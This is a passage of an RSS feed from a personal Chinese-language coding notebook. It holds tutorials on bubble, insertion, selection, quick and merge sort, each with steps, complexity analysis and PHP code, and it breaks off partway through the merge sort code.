<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Codiy's Notebook – Documentation</title><link>https://note.codiy.net/docs/</link><description>Recent content in Documentation on Codiy's Notebook</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><atom:link href="https://note.codiy.net/docs/index.xml" rel="self" type="application/rss+xml"/><item><title>Docs: 01-冒泡排序</title><link>https://note.codiy.net/docs/2020/04/01-bubble/</link><pubDate>Tue, 21 Apr 2020 20:54:40 +0800</pubDate><guid>https://note.codiy.net/docs/2020/04/01-bubble/</guid><description>
&lt;h2 id="1-基本思想">1 基本思想&lt;/h2>
&lt;p>冒泡排序算法是重复地走访要排序的数列，一次比较相邻的两个元素，如果他们的顺序与排序要求相反，就将它们互换，直到没有再需要交换的数字，则说明排序完成。&lt;/p>
&lt;h2 id="2-算法过程">2 算法过程&lt;/h2>
&lt;p>1、比较相邻的两个元素，如果前面的数大于后面的数，就将两个数进行交换；&lt;/p>
&lt;p>2、从开始第一对到结尾的最后一对，对每一对相邻元素作第1）操作。这步做完后，最大的数就会沉到数组的最后。&lt;/p>
&lt;p>3、然后再从头开始，重复第 1 和第 2 操作，直到倒数第二位时结束。&lt;/p>
&lt;h2 id="3-算法图解">3 算法图解&lt;/h2>
&lt;p>
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/algorithm/2020-04/bubble.gif"
alt="冒泡排序算法示意图"
/>
&lt;/p>&lt;/p>
&lt;h2 id="4-php代码实现">4 PHP代码实现&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#cd5555">/**
&lt;/span>&lt;span style="color:#cd5555"> * 冒泡排序: 循环n-1次, 每次使最大的往后面放, 交换相邻两元素
&lt;/span>&lt;span style="color:#cd5555"> * 时间复杂度: O(n2)
&lt;/span>&lt;span style="color:#cd5555"> * 空间复杂度: O(1)
&lt;/span>&lt;span style="color:#cd5555"> * 稳定排序
&lt;/span>&lt;span style="color:#cd5555"> */&lt;/span>
&lt;span style="color:#8b008b;font-weight:bold">function&lt;/span> &lt;span style="color:#008b45">bubbleSort&lt;/span>(&amp;amp;&lt;span style="color:#00688b">$arr&lt;/span>) {
&lt;span style="color:#00688b">$length&lt;/span> = count(&lt;span style="color:#00688b">$arr&lt;/span>);
&lt;span style="color:#8b008b;font-weight:bold">for&lt;/span>(&lt;span style="color:#00688b">$i&lt;/span> = &lt;span style="color:#b452cd">1&lt;/span>; &lt;span style="color:#00688b">$i&lt;/span> &amp;lt; &lt;span style="color:#00688b">$length&lt;/span>; ++&lt;span style="color:#00688b">$i&lt;/span>) { &lt;span style="color:#228b22">// 循环 $length - 1 次
&lt;/span>&lt;span style="color:#228b22">&lt;/span> &lt;span style="color:#8b008b;font-weight:bold">for&lt;/span>(&lt;span style="color:#00688b">$j&lt;/span> = &lt;span style="color:#b452cd">0&lt;/span>; &lt;span style="color:#00688b">$j&lt;/span> &amp;lt; &lt;span style="color:#00688b">$length&lt;/span> - &lt;span style="color:#00688b">$i&lt;/span> ; ++&lt;span style="color:#00688b">$j&lt;/span>) {&lt;span style="color:#228b22">// 每次使最大的放到最后
&lt;/span>&lt;span style="color:#228b22">&lt;/span> &lt;span style="color:#8b008b;font-weight:bold">if&lt;/span> (&lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$j&lt;/span> + &lt;span style="color:#b452cd">1&lt;/span>] &amp;lt; &lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$j&lt;/span>]) {&lt;span style="color:#228b22">// 交换相邻两元素
&lt;/span>&lt;span style="color:#228b22">&lt;/span> &lt;span style="color:#8b008b;font-weight:bold">list&lt;/span>(&lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$j&lt;/span>], &lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$j&lt;/span> + &lt;span style="color:#b452cd">1&lt;/span>]) = [&lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$j&lt;/span> + &lt;span style="color:#b452cd">1&lt;/span>], &lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$j&lt;/span>]];
}
}
}
}
&lt;span style="color:#00688b">$arr&lt;/span> = [&lt;span style="color:#b452cd">38&lt;/span>, &lt;span style="color:#b452cd">19&lt;/span>, &lt;span style="color:#b452cd">29&lt;/span>, &lt;span style="color:#b452cd">91&lt;/span>, &lt;span style="color:#b452cd">85&lt;/span>, &lt;span style="color:#b452cd">12&lt;/span>, &lt;span style="color:#b452cd">41&lt;/span>, &lt;span style="color:#b452cd">21&lt;/span>];
bubbleSort(&lt;span style="color:#00688b">$arr&lt;/span>);
print_r(&lt;span style="color:#00688b">$arr&lt;/span>);
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="5-效率分析">5 效率分析&lt;/h2>
&lt;p>1、时间复杂度：O(n²)
最好的情况：待排序记录按关键字从小到大排列（正序），需要比较n-1次，时间复杂度为O(n);
最坏的情况：待排序记录按关键字从大到小排列（逆序），需要比较n-1+n-2+…+1=n(n-1)/2，交换次数和比较次数等值，时间复杂度依然为O(n²)。
2、空间复杂度：O(1)，是稳定排序&lt;/p>
&lt;h2 id="6-算法改进">6 算法改进&lt;/h2>
&lt;p>TODO 设置标志变量$swapped&lt;/p></description></item><item><title>Docs: 02-插入排序</title><link>https://note.codiy.net/docs/2020/04/02-%E6%8F%92%E5%85%A5%E6%8E%92%E5%BA%8F/</link><pubDate>Tue, 21 Apr 2020 21:42:04 +0800</pubDate><guid>https://note.codiy.net/docs/2020/04/02-%E6%8F%92%E5%85%A5%E6%8E%92%E5%BA%8F/</guid><description>
&lt;h2 id="1-基本思想">1 基本思想&lt;/h2>
&lt;p>插入排序算法是每一步将一个待排序的数据插入到前面已经排好序的有序序列中，直到所有元素插入完毕为止。&lt;/p>
&lt;h2 id="2-算法过程">2 算法过程&lt;/h2>
&lt;p>1、将第一个元素看做一个有序序列，把第二个元素到最后一个元素当成是未排序序列；&lt;/p>
&lt;p>2、从头到尾依次扫描未排序序列，将扫描到的每个元素插入有序序列的适当位置（如果待插入的元素与有序序列中的某个元素相等，则将待插入元素插入到相等元素的后面，这样的插入方式，排序是稳定的）。&lt;/p>
&lt;h2 id="3-算法图解">3 算法图解&lt;/h2>
&lt;p>
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/algorithm/2020-04/insert.gif"
alt="算法图解"
/>
&lt;/p>&lt;/p>
&lt;h2 id="4-php代码实现">4 PHP代码实现&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#cd5555">/**
&lt;/span>&lt;span style="color:#cd5555"> * 插入排序: 每次往后多取一个元素, 和现有元素从后往前逐个比较, 比较大,就将现有元素后移一位
&lt;/span>&lt;span style="color:#cd5555"> * 时间复杂度: O(n2)
&lt;/span>&lt;span style="color:#cd5555"> * 空间复杂度: O(1)
&lt;/span>&lt;span style="color:#cd5555"> * 稳定排序
&lt;/span>&lt;span style="color:#cd5555"> */&lt;/span>
&lt;span style="color:#8b008b;font-weight:bold">function&lt;/span> &lt;span style="color:#008b45">insertSort&lt;/span>(&amp;amp;&lt;span style="color:#00688b">$arr&lt;/span>) {
&lt;span style="color:#00688b">$length&lt;/span> = count(&lt;span style="color:#00688b">$arr&lt;/span>);
&lt;span style="color:#8b008b;font-weight:bold">for&lt;/span>(&lt;span style="color:#00688b">$i&lt;/span> = &lt;span style="color:#b452cd">1&lt;/span>; &lt;span style="color:#00688b">$i&lt;/span> &amp;lt; &lt;span style="color:#00688b">$length&lt;/span>; ++&lt;span style="color:#00688b">$i&lt;/span>) {&lt;span style="color:#228b22">// 每次往后多取一个元素
&lt;/span>&lt;span style="color:#228b22">&lt;/span> &lt;span style="color:#00688b">$temp&lt;/span> = &lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$i&lt;/span>];
&lt;span style="color:#8b008b;font-weight:bold">for&lt;/span>(&lt;span style="color:#00688b">$j&lt;/span> = &lt;span style="color:#00688b">$i&lt;/span> - &lt;span style="color:#b452cd">1&lt;/span>; &lt;span style="color:#00688b">$j&lt;/span> &amp;gt;= &lt;span style="color:#b452cd">0&lt;/span>; --&lt;span style="color:#00688b">$j&lt;/span>) {&lt;span style="color:#228b22">// 和现有元素逐个从后往前比较
&lt;/span>&lt;span style="color:#228b22">&lt;/span> &lt;span style="color:#8b008b;font-weight:bold">if&lt;/span> (&lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$j&lt;/span>] &amp;gt; &lt;span style="color:#00688b">$temp&lt;/span>) { &lt;span style="color:#228b22">// 比较大,就将现有元素后移一位
&lt;/span>&lt;span style="color:#228b22">&lt;/span> &lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$j&lt;/span> + &lt;span style="color:#b452cd">1&lt;/span>] = &lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$j&lt;/span>];
&lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$j&lt;/span>] = &lt;span style="color:#00688b">$temp&lt;/span>;
} &lt;span style="color:#8b008b;font-weight:bold">else&lt;/span> {
&lt;span style="color:#8b008b;font-weight:bold">break&lt;/span>;
}
}
}
}
&lt;span style="color:#00688b">$arr&lt;/span> = [&lt;span style="color:#b452cd">38&lt;/span>, &lt;span style="color:#b452cd">19&lt;/span>, &lt;span style="color:#b452cd">29&lt;/span>, &lt;span style="color:#b452cd">91&lt;/span>, &lt;span style="color:#b452cd">85&lt;/span>, &lt;span style="color:#b452cd">12&lt;/span>, &lt;span style="color:#b452cd">41&lt;/span>, &lt;span style="color:#b452cd">21&lt;/span>];
insertSort(&lt;span style="color:#00688b">$arr&lt;/span>);
print_r(&lt;span style="color:#00688b">$arr&lt;/span>);
&lt;span style="color:#8b008b;font-weight:bold">function&lt;/span> &lt;span style="color:#008b45">insertSort2&lt;/span>(&amp;amp;&lt;span style="color:#00688b">$arr&lt;/span>) {
&lt;span style="color:#00688b">$length&lt;/span> = count(&lt;span style="color:#00688b">$arr&lt;/span>);
&lt;span style="color:#8b008b;font-weight:bold">for&lt;/span>(&lt;span style="color:#00688b">$i&lt;/span> = &lt;span style="color:#b452cd">1&lt;/span>; &lt;span style="color:#00688b">$i&lt;/span> &amp;lt; &lt;span style="color:#00688b">$length&lt;/span>; ++&lt;span style="color:#00688b">$i&lt;/span>) {&lt;span style="color:#228b22">// 每次往前多取一个元素
&lt;/span>&lt;span style="color:#228b22">&lt;/span> &lt;span style="color:#8b008b;font-weight:bold">for&lt;/span>(&lt;span style="color:#00688b">$j&lt;/span> = &lt;span style="color:#b452cd">0&lt;/span>; &lt;span style="color:#00688b">$j&lt;/span> &amp;lt; &lt;span style="color:#00688b">$i&lt;/span>; ++&lt;span style="color:#00688b">$j&lt;/span>) {&lt;span style="color:#228b22">// 和现有元素逐个从前往后比较
&lt;/span>&lt;span style="color:#228b22">&lt;/span> &lt;span style="color:#8b008b;font-weight:bold">if&lt;/span> (&lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$j&lt;/span>] &amp;gt; &lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$i&lt;/span>]) { &lt;span style="color:#228b22">// 找到第一个比它大的元素, 交换, 后续元素往后移一位
&lt;/span>&lt;span style="color:#228b22">&lt;/span> &lt;span style="color:#8b008b;font-weight:bold">list&lt;/span>(&lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$i&lt;/span>], &lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$j&lt;/span>]) = [&lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$j&lt;/span>], &lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$i&lt;/span>]];
}
}
}
}
&lt;span style="color:#00688b">$arr&lt;/span> = [&lt;span style="color:#b452cd">38&lt;/span>, &lt;span style="color:#b452cd">19&lt;/span>, &lt;span style="color:#b452cd">29&lt;/span>, &lt;span style="color:#b452cd">91&lt;/span>, &lt;span style="color:#b452cd">85&lt;/span>, &lt;span style="color:#b452cd">12&lt;/span>, &lt;span style="color:#b452cd">41&lt;/span>, &lt;span style="color:#b452cd">21&lt;/span>];
insertSort2(&lt;span style="color:#00688b">$arr&lt;/span>);
print_r(&lt;span style="color:#00688b">$arr&lt;/span>);
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="5-效率分析">5 效率分析&lt;/h2>
&lt;p>1、时间复杂度：O(n²)
最好的情况：待排序记录按关键字从小到大排列（正序），需要比较n-1次，不需要交换元素，时间复杂度为O(n);
最坏的情况：待排序记录按关键字从大到小排列（逆序），时间复杂度为O(n²)。
2、空间复杂度：O(1)，是稳定排序。&lt;/p></description></item><item><title>Docs: 03-选择排序</title><link>https://note.codiy.net/docs/2020/04/03-%E9%80%89%E6%8B%A9%E6%8E%92%E5%BA%8F/</link><pubDate>Tue, 21 Apr 2020 22:40:14 +0800</pubDate><guid>https://note.codiy.net/docs/2020/04/03-%E9%80%89%E6%8B%A9%E6%8E%92%E5%BA%8F/</guid><description>
&lt;h2 id="1-基本思想">1 基本思想&lt;/h2>
&lt;p>选择排序算法是从前往后遍历元素，每次假定当前元素为最小元素，再次遍历剩余元素，找到找到真正最小的元素，交换位置，直到元素有序。&lt;/p>
&lt;h2 id="2-算法过程">2 算法过程&lt;/h2>
&lt;p>1、将第一个元素当成最小元素，跟它后面的元素逐个比较，暂存最小元素的下标，第一趟结束后，将第一个数，与暂存的那个最小数进行交换，第一个数就是最小数
2、下标移到第二位，第二个数跟后面的所有数相比，一趟下来，确定第二小数
3、重复以上步骤，直到有序&lt;/p>
&lt;h2 id="3-算法图解">3 算法图解&lt;/h2>
&lt;p>
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/algorithm/2020-04/select.gif"
alt="算法图解"
/>
&lt;/p>&lt;/p>
&lt;h2 id="4-php代码实现">4 PHP代码实现&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#cd5555">/**
&lt;/span>&lt;span style="color:#cd5555"> * 选择排序: 选一个假定的最小, 找到比他小的, 交换位置
&lt;/span>&lt;span style="color:#cd5555"> * 时间复杂度: O(n2)
&lt;/span>&lt;span style="color:#cd5555"> * 空间复杂度: O(2)
&lt;/span>&lt;span style="color:#cd5555"> * 稳定排序
&lt;/span>&lt;span style="color:#cd5555"> */&lt;/span>
&lt;span style="color:#8b008b;font-weight:bold">function&lt;/span> &lt;span style="color:#008b45">selectSort&lt;/span>(&amp;amp;&lt;span style="color:#00688b">$arr&lt;/span>) {
&lt;span style="color:#00688b">$length&lt;/span> = count(&lt;span style="color:#00688b">$arr&lt;/span>);
&lt;span style="color:#8b008b;font-weight:bold">for&lt;/span>(&lt;span style="color:#00688b">$i&lt;/span> = &lt;span style="color:#b452cd">0&lt;/span>; &lt;span style="color:#00688b">$i&lt;/span> &amp;lt; &lt;span style="color:#00688b">$length&lt;/span>; ++&lt;span style="color:#00688b">$i&lt;/span>) {
&lt;span style="color:#00688b">$minIdx&lt;/span> = &lt;span style="color:#00688b">$i&lt;/span>;
&lt;span style="color:#8b008b;font-weight:bold">for&lt;/span>(&lt;span style="color:#00688b">$j&lt;/span> = &lt;span style="color:#00688b">$i&lt;/span> + &lt;span style="color:#b452cd">1&lt;/span>; &lt;span style="color:#00688b">$j&lt;/span> &amp;lt; &lt;span style="color:#00688b">$length&lt;/span>; ++&lt;span style="color:#00688b">$j&lt;/span>) {
&lt;span style="color:#8b008b;font-weight:bold">if&lt;/span> (&lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$j&lt;/span>] &amp;lt; &lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$minIdx&lt;/span>]) {
&lt;span style="color:#00688b">$minIdx&lt;/span> = &lt;span style="color:#00688b">$j&lt;/span>;
}
}
&lt;span style="color:#8b008b;font-weight:bold">if&lt;/span> (&lt;span style="color:#00688b">$minIdx&lt;/span> != &lt;span style="color:#00688b">$i&lt;/span>) {
&lt;span style="color:#8b008b;font-weight:bold">list&lt;/span>(&lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$minIdx&lt;/span>], &lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$i&lt;/span>]) = [&lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$i&lt;/span>], &lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$minIdx&lt;/span>]];
}
}
}
&lt;span style="color:#00688b">$arr&lt;/span> = [&lt;span style="color:#b452cd">38&lt;/span>, &lt;span style="color:#b452cd">19&lt;/span>, &lt;span style="color:#b452cd">29&lt;/span>, &lt;span style="color:#b452cd">91&lt;/span>, &lt;span style="color:#b452cd">85&lt;/span>, &lt;span style="color:#b452cd">12&lt;/span>, &lt;span style="color:#b452cd">41&lt;/span>, &lt;span style="color:#b452cd">21&lt;/span>];
selectSort(&lt;span style="color:#00688b">$arr&lt;/span>);
print_r(&lt;span style="color:#00688b">$arr&lt;/span>);
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="5-效率分析">5 效率分析&lt;/h2>
&lt;p>1、时间复杂度O(n2)
(n-1) + (n-2) + &amp;hellip; + 1 ==&amp;gt; n(n-1)/2&lt;/p>
&lt;p>2、空间复杂度O(1)&lt;/p></description></item><item><title>Docs: 04-快速排序</title><link>https://note.codiy.net/docs/2020/04/04-%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/</link><pubDate>Wed, 22 Apr 2020 21:29:26 +0800</pubDate><guid>https://note.codiy.net/docs/2020/04/04-%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/</guid><description>
&lt;h2 id="1-基本思想">1 基本思想&lt;/h2>
&lt;p>通过一趟排序将待排记录分隔成独立的两部分，其中一部分记录的关键字均比另一部分的关键字小，则可分别对这两部分记录继续进行排序，以达到整个序列有序。&lt;/p>
&lt;h2 id="2-算法过程">2 算法过程&lt;/h2>
&lt;p>1、从数列中挑出一个元素，称为 “基准”（pivot）；
2、将待排序元素进行分区，比基准值小的元素放在基准值前面，比基准值大的元素放在基准值后面。分区结束后，该基准值就处于数组的中间位置；这个称为分区（partition）操作；
3、递归地（recursive）对左右两个分区重复以上步骤直到所有元素都是有序的。&lt;/p>
&lt;h2 id="3-算法图解">3 算法图解&lt;/h2>
&lt;p>
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/algorithm/2020-04/quick.gif"
alt="算法图解"
/>
&lt;/p>&lt;/p>
&lt;h2 id="4-php代码实现">4 PHP代码实现&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#cd5555">/**
&lt;/span>&lt;span style="color:#cd5555"> * 快速排序: 每次选最左边的点, 将数组划分为左右两部分, 保证右边的比选点大,左边的都比选点小, 对左右两边递归
&lt;/span>&lt;span style="color:#cd5555"> * 时间复杂度: 最好 O(nlogn) 最差 O(n2)
&lt;/span>&lt;span style="color:#cd5555"> * 空间复杂度: O(1)
&lt;/span>&lt;span style="color:#cd5555"> * 不稳定排序
&lt;/span>&lt;span style="color:#cd5555"> */&lt;/span>
&lt;span style="color:#8b008b;font-weight:bold">function&lt;/span> &lt;span style="color:#008b45">quickSort&lt;/span>(&amp;amp;&lt;span style="color:#00688b">$arr&lt;/span>, &lt;span style="color:#00688b">$start&lt;/span>, &lt;span style="color:#00688b">$end&lt;/span>) {
&lt;span style="color:#00688b">$i&lt;/span> = &lt;span style="color:#00688b">$start&lt;/span>;
&lt;span style="color:#00688b">$j&lt;/span> = &lt;span style="color:#00688b">$end&lt;/span>;
&lt;span style="color:#00688b">$pivot&lt;/span> = &lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$start&lt;/span>];
&lt;span style="color:#8b008b;font-weight:bold">while&lt;/span> (&lt;span style="color:#00688b">$j&lt;/span> &amp;gt; &lt;span style="color:#00688b">$i&lt;/span>) {
&lt;span style="color:#228b22">// 右边有比选点小的, 扔到左边, 让下一while得以继续
&lt;/span>&lt;span style="color:#228b22">&lt;/span> &lt;span style="color:#8b008b;font-weight:bold">while&lt;/span> (&lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$j&lt;/span>] &amp;gt;= &lt;span style="color:#00688b">$pivot&lt;/span> &amp;amp;&amp;amp; &lt;span style="color:#00688b">$j&lt;/span> &amp;gt; &lt;span style="color:#00688b">$i&lt;/span>) {
&lt;span style="color:#00688b">$j&lt;/span>--;
}
&lt;span style="color:#8b008b;font-weight:bold">if&lt;/span> (&lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$j&lt;/span>] &amp;lt;= &lt;span style="color:#00688b">$pivot&lt;/span>) {
&lt;span style="color:#00688b">$temp&lt;/span> = &lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$j&lt;/span>];
&lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$j&lt;/span>] = &lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$i&lt;/span>];
&lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$i&lt;/span>] = &lt;span style="color:#00688b">$temp&lt;/span>;
}
&lt;span style="color:#228b22">// 左边的有比选点大的就,扔到右边, 让上一while得以继续
&lt;/span>&lt;span style="color:#228b22">&lt;/span> &lt;span style="color:#8b008b;font-weight:bold">while&lt;/span> (&lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$i&lt;/span>] &amp;lt;= &lt;span style="color:#00688b">$pivot&lt;/span> &amp;amp;&amp;amp; &lt;span style="color:#00688b">$j&lt;/span> &amp;gt; &lt;span style="color:#00688b">$i&lt;/span>) {
&lt;span style="color:#00688b">$i&lt;/span>++;
}
&lt;span style="color:#8b008b;font-weight:bold">if&lt;/span> (&lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$i&lt;/span>] &amp;gt;= &lt;span style="color:#00688b">$pivot&lt;/span>) {
&lt;span style="color:#00688b">$temp&lt;/span> = &lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$i&lt;/span>];
&lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$i&lt;/span>] = &lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$j&lt;/span>];
&lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$j&lt;/span>] = &lt;span style="color:#00688b">$temp&lt;/span>;
}
}
&lt;span style="color:#228b22">// 循环结束后，i,j都指向选点
&lt;/span>&lt;span style="color:#228b22">&lt;/span> &lt;span style="color:#8b008b;font-weight:bold">if&lt;/span> (&lt;span style="color:#00688b">$i&lt;/span> &amp;gt; &lt;span style="color:#00688b">$start&lt;/span>) {
quickSort(&lt;span style="color:#00688b">$arr&lt;/span>, &lt;span style="color:#00688b">$start&lt;/span>, &lt;span style="color:#00688b">$i&lt;/span> - &lt;span style="color:#b452cd">1&lt;/span>);
}
&lt;span style="color:#8b008b;font-weight:bold">if&lt;/span> (&lt;span style="color:#00688b">$j&lt;/span> &amp;lt; &lt;span style="color:#00688b">$end&lt;/span>) {
quickSort(&lt;span style="color:#00688b">$arr&lt;/span>, &lt;span style="color:#00688b">$j&lt;/span> + &lt;span style="color:#b452cd">1&lt;/span>, &lt;span style="color:#00688b">$end&lt;/span>);
}
}
&lt;span style="color:#00688b">$arr&lt;/span> = [&lt;span style="color:#b452cd">38&lt;/span>, &lt;span style="color:#b452cd">19&lt;/span>, &lt;span style="color:#b452cd">29&lt;/span>, &lt;span style="color:#b452cd">91&lt;/span>, &lt;span style="color:#b452cd">85&lt;/span>, &lt;span style="color:#b452cd">12&lt;/span>, &lt;span style="color:#b452cd">41&lt;/span>, &lt;span style="color:#b452cd">21&lt;/span>];
quickSort(&lt;span style="color:#00688b">$arr&lt;/span>, &lt;span style="color:#b452cd">0&lt;/span>, count(&lt;span style="color:#00688b">$arr&lt;/span>) - &lt;span style="color:#b452cd">1&lt;/span>);
print_r(&lt;span style="color:#00688b">$arr&lt;/span>);
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="5-效率分析">5 效率分析&lt;/h2>
&lt;p>1、时间复杂度：O(nlogn)
最好的情况：当分区选取的基准元素为待排序元素中的&amp;quot;中值&amp;quot;，时间复杂度为O(nlogn);
最坏的情况：当分区选取的基准元素为待排序元素中的最大或最小值，时间复杂度为O(n²)。
2、空间复杂度：O(log2n)，是不稳定排序。&lt;/p></description></item><item><title>Docs: 05-归并排序</title><link>https://note.codiy.net/docs/2020/04/05-%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F/</link><pubDate>Wed, 22 Apr 2020 21:59:01 +0800</pubDate><guid>https://note.codiy.net/docs/2020/04/05-%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F/</guid><description>
&lt;h2 id="1-基本思想">1 基本思想&lt;/h2>
&lt;p>归并排序算法是将两个（或两个以上）有序表合并成一个新的有序表，即把待排序序列分为若干个子序列，使每个子序列有序，再将已有序的子序列合并，得到完全有序的序列。该算法是采用分治法（Divide and Conquer）的一个非常典型的应用。&lt;/p>
&lt;h2 id="2-算法过程">2 算法过程&lt;/h2>
&lt;p>1、“分解”——将序列每次折半划分。
2、“合并”——将划分后的序列段两两合并后排序。&lt;/p>
&lt;h2 id="3-算法图解">3 算法图解&lt;/h2>
&lt;p>
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/algorithm/2020-04/merge.gif"
alt="算法图解"
/>
&lt;/p>&lt;/p>
&lt;h2 id="4-php代码实现">4 PHP代码实现&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#cd5555">/**
&lt;/span>&lt;span style="color:#cd5555"> * 归并排序: 对半拆分元素, 拆到底后, 比较左右两边元素, 让其有序后, 回归
&lt;/span>&lt;span style="color:#cd5555"> * 时间复杂度: O(nlogn)
&lt;/span>&lt;span style="color:#cd5555"> * 空间复杂度: O(n)
&lt;/span>&lt;span style="color:#cd5555"> * 稳定排序(相等元素的顺序不会改变)
&lt;/span>&lt;span style="color:#cd5555"> */&lt;/span>
&lt;span style="color:#8b008b;font-weight:bold">function&lt;/span> &lt;span style="color:#008b45">mergeSort&lt;/span>(&amp;amp;&lt;span style="color:#00688b">$arr&lt;/span>, &lt;span style="color:#00688b">$start&lt;/span>, &lt;span style="color:#00688b">$end&lt;/span>) {
&lt;span style="color:#8b008b;font-weight:bold">if&lt;/span> (&lt;span style="color:#00688b">$start&lt;/span> &amp;lt; &lt;span style="color:#00688b">$end&lt;/span>) {
&lt;span style="color:#00688b">$mid&lt;/span> = floor((&lt;span style="color:#00688b">$start&lt;/span> + &lt;span style="color:#00688b">$end&lt;/span>) / &lt;span style="color:#b452cd">2&lt;/span>);
mergeSort(&lt;span style="color:#00688b">$arr&lt;/span>, &lt;span style="color:#00688b">$start&lt;/span>, &lt;span style="color:#00688b">$mid&lt;/span>);
mergeSort(&lt;span style="color:#00688b">$arr&lt;/span>, &lt;span style="color:#00688b">$mid&lt;/span> + &lt;span style="color:#b452cd">1&lt;/span>, &lt;span style="color:#00688b">$end&lt;/span>);
merge(&lt;span style="color:#00688b">$arr&lt;/span>, &lt;span style="color:#00688b">$start&lt;/span>, &lt;span style="color:#00688b">$mid&lt;/span>, &lt;span style="color:#00688b">$end&lt;/span>);
}
}
&lt;span style="color:#8b008b;font-weight:bold">function&lt;/span> &lt;span style="color:#008b45">merge&lt;/span>(&amp;amp;&lt;span style="color:#00688b">$arr&lt;/span>, &lt;span style="color:#00688b">$start&lt;/span>, &lt;span style="color:#00688b">$mid&lt;/span>, &lt;span style="color:#00688b">$end&lt;/span>) {
&lt;span style="color:#00688b">$i&lt;/span> = &lt;span style="color:#00688b">$start&lt;/span>;
&lt;span style="color:#00688b">$j&lt;/span> = &lt;span style="color:#00688b">$mid&lt;/span> + &lt;span style="color:#b452cd">1&lt;/span>;
&lt;span style="color:#00688b">$temp&lt;/span> = [];
&lt;span style="color:#8b008b;font-weight:bold">while&lt;/span>( &lt;span style="color:#00688b">$i&lt;/span> &amp;lt;= &lt;span style="color:#00688b">$mid&lt;/span> &amp;amp;&amp;amp; &lt;span style="color:#00688b">$j&lt;/span> &amp;lt;= &lt;span style="color:#00688b">$end&lt;/span>) {
&lt;span style="color:#8b008b;font-weight:bold">if&lt;/span>(&lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$i&lt;/span>] &amp;lt; &lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$j&lt;/span>]) {
&lt;span style="color:#00688b">$temp&lt;/span>[] = &lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$i&lt;/span>];
++&lt;span style="color:#00688b">$i&lt;/span>;
} &lt;span style="color:#8b008b;font-weight:bold">else&lt;/span> {
&lt;span style="color:#00688b">$temp&lt;/span>[] = &lt;span style="color:#00688b">$arr&lt;/span>[&lt;span style="color:#00688b">$j&lt;/span>];
